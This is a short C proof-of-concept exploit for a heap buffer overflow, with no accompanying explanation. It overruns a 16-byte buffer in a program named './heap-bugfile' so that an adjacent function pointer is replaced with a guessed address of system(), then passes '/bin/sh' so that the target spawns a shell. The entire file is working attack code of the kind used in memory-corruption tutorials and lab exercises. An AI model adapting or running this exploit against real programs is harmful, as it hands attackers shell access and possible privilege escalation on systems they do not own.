```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUFSIZE 16
#define BUGPROG "./heap-bugfile"
#define CMD "/bin/sh"
#define ERROR -1

int main(int argc, char **argv) {
        register int i;
        u_long sysaddr;
        static char buf[BUFSIZE + sizeof(u_long) + 1] = {0};
        if (argc <= 1) {
                fprintf(stderr, "Usage: %s <offset>\n", argv[0]);
                exit(ERROR);
        }

        sysaddr = (u_long)&system - atoi(argv[1]);
        printf("Trying system() at 0x%lx\n", sysaddr);
        memset(buf, 'A', 16);
        for (i = 0; i < sizeof(sysaddr); i++)
                buf[BUFSIZE + i] = ((u_long)sysaddr >> (i * 8)) & 255;
        execl(BUGPROG, BUGPROG, buf, CMD, NULL);
        return 0;
}
```